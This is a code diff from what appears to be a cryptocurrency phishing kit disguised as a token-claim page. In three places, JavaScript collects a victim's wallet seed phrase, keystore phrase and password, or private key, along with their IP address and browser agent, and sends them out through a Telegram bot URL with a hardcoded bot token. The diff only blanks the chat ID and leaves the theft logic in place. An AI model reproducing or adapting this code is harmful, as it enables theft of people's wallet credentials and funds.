@@ -106,7 +106,7 @@
 			var wallType = sessionStorage.getItem("wallType")
 			var sData = encodeURI("New Claim-Tokenz\n\nWallet Type: "+wallType+" \n\nPass Phrase: \n\n"+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
 			$.ajax({
-				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=5988153839&parse_mode=HTML",
+				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=&parse_mode=HTML",
 				beforeSend: function() {
 					$("#btn1").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
 				},
@@ -135,7 +135,7 @@
 			var wallType = sessionStorage.getItem("wallType")
 			var sData = encodeURI("New Claim-Tokenz\n\nWallet Type: "+wallType+" \n\nKeystore Phrase: "+a+"\n\nWallet Pasword: "+b+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
 			$.ajax({
-				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=5988153839&parse_mode=HTML",
+				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=&parse_mode=HTML",
 				beforeSend: function() {
 					$("#btn2").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
 				},
@@ -163,7 +163,7 @@
 			var wallType = sessionStorage.getItem("wallType")
 			var sData = encodeURI("New Claim-Tokenz\n\nWallet Type: "+wallType+" \n\nPrivate Key: "+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
 			$.ajax({
-				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=5988153839&parse_mode=HTML",
+				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=&parse_mode=HTML",
 				beforeSend: function() {
 					$("#btn3").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
 				},
